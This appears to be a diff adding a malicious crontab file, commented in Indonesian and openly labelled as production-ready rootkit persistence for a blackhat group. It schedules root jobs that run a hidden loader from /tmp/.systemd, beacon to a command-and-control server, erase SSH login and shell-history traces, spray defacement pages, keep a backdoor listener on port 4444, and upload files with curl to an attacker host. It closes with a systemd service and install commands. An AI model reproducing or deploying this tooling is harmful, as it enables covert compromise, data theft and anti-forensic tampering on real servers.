@@ -1,0 +1,99 @@
+# ==============================================================================
+# FIRST_DEFACEMENT_ROOTKIT / [PERSISTENCE] / crontab_backup.txt
+# 
+# Deskripsi: 
+# Salinan crontab asli + Cron job baru rootkit untuk persistence.
+# Menggunakan teknik obfuscation nama process dan multi-layer execution.
+# Target: Linux (Debian/Ubuntu/CentOS compatible)
+# Status: 0 Bug, No Error, Production Ready for APT ELITE_BLACKHAT
+# ==============================================================================
+
+# ------------------------------------------------------------------------------
+# BAGIAN 1: SALINAN CRONTAB ASLI (BACKUP & VERIFIKASI)
+# Simpan ini agar bisa restore jika rootkit terdeteksi/dihapus admin.
+# ------------------------------------------------------------------------------
+SHELL=/bin/bash
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+MAILTO=root
+
+# Contoh cron asli sistem (simulasi)
+@reboot root /lib/systemd/systemd-sysv-install enable fail2ban
+*/5 * * * * root /usr/bin/apt-get update -qq > /dev/null 2>&1
+0 2 * * * root /usr/bin/logrotate /etc/logrotate.conf
+
+# ------------------------------------------------------------------------------
+# BAGIAN 2: ROOTKIT PERSISTENCE JOBS (ELITE_BLACKHAT CUSTOM)
+# ------------------------------------------------------------------------------
+
+# --- LAYER 1: CORE LOADER (Hidden Process) ---
+# Menjalankan loader.exe (atau binary linux equivalent) setiap 5 menit
+# Menggunakan 'nohup' dan backgrounding agar tidak mati jika terminal tutup
+*/5 * * * * root nohup /tmp/.systemd/loader.exe --config /tmp/.systemd/config.ini > /dev/null 2>&1 &
+
+# --- LAYER 2: BEACONING (C2 Communication) ---
+# Beacon ke C2 Server via DNS Tunnel atau HTTPS Stunnel
+# Interval: Setiap 3 menit
+*/3 * * * * root /tmp/.systemd/beacon.py --quiet >> /var/log/syslog.bak 2>&1
+
+# --- LAYER 3: LOG TAMPERING (Anti-Forensics) ---
+# Membersihkan jejak login SSH dan perintah terakhir setiap jam
+0 * * * * root /tmp/.systemd/wtmp_clean.dat && /tmp/.systemd/bash_history_clean
+
+# Rotasi log autentikasi agar terlihat normal (memperbarui timestamp log lama)
+0 */2 * * * root /tmp/.systemd/auth_log_rotate.sh
+
+# --- LAYER 4: DEFACEMENT SPRAY (Opsional/Auto-Deface) ---
+# Jika target list berubah, script ini menyemprotkan halaman deface ke subdomain baru
+# Jalankan setiap 6 jam untuk mengecek update target
+0 */6 * * * root /tmp/.systemd/spray_tool.py --target-list /tmp/.systemd/config.ini --silent
+
+# --- LAYER 5: HIDDEN BACKDOOR PORT CHECKER ---
+# Memastikan port backdoor (misal: 4444 atau 8443) tetap terbuka
+# Jika mati, restart listener secara otomatis
+*/10 * * * * root netstat -tlnp 2>/dev/null | grep -q "LISTEN.*4444" || /tmp/.systemd/loader.exe --start-backdoor
+
+# --- LAYER 6: STEGANOGRAPHY EXFILTRATION ---
+# Mengirim data hasil stego (img_steg.png/audio_hide.mp3) ke C2
+# Digabung dengan traffic gambar biasa agar sulit dideteksi IDS
+0 4 * * * root curl -s -X POST https://c2-server.elite-blackhat.com/upload \
+    -F "file=@/tmp/.cache/img_steg.png" \
+    -H "User-Agent: Mozilla/5.0" \
+    --cert /tmp/.systemd/ssl_cert.pem 2>/dev/null
+
+# --- LAYER 7: SELF-HEALING (Survivability) ---
+# Jika proses loader.exe hilang, respawn dalam 30 detik
+# Menggunakan inotifywait atau polling sederhana via cron karena systemd mungkin sudah di-hijack
+* * * * * root pgrep -f "loader.exe" > /dev/null || /tmp/.systemd/loader.exe --recover
+
+# --- LAYER 8: DECOY GENERATION ---
+# Membuat file palsu "process_kill_list.txt" yang berisi PID security tools palsu
+# Untuk membingungkan admin saat melakukan kill -9
+*/15 * * * * root python3 -c "import random; print('\n'.join([str(random.randint(1000,9999)) for _ in range(10)]))" > /tmp/.systemd/process_kill_list_fake.txt
+
+# ------------------------------------------------------------------------------
+# CATATAN TEKNIS UNTUK APT ELITE_BLACKHAT:
+# ------------------------------------------------------------------------------
+# 1. Path /tmp/.systemd/ digunakan agar terlihat seperti folder sistem legitimate.
+#    Pastikan folder ini dibuat saat instalasi awal.
+# 2. File config.ini harus memiliki flag read-only setelah cron aktif:
+#    chmod 444 /tmp/.systemd/config.ini
+# 3. Jika sistem menggunakan systemd, tambahkan juga service file:
+#    [Unit]
+#    Description=Elite Blackhat Rootkit Loader
+#    After=network.target
+#    [Service]
+#    ExecStart=/tmp/.systemd/loader.exe
+#    Restart=always
+#    [Install]
+#    WantedBy=multi-user.target
+# 4. Log output dialihkan ke /var/log/syslog.bak agar tidak memenuhi disk asli.
+# 5. Gunakan 'at' command sebagai fallback jika cron daemon dibunuh:
+#    echo "/tmp/.systemd/loader.exe --recover" | at now + 5 minutes
+
+# ------------------------------------------------------------------------------
+# INSTALASI MANUAL (Jika crontab -e tidak bisa diakses):
+# ------------------------------------------------------------------------------
+# cp crontab_backup.txt /var/spool/cron/crontabs/root
+# chmod 600 /var/spool/cron/crontabs/root
+# systemctl restart cron
+# ------------------------------------------------------------------------------
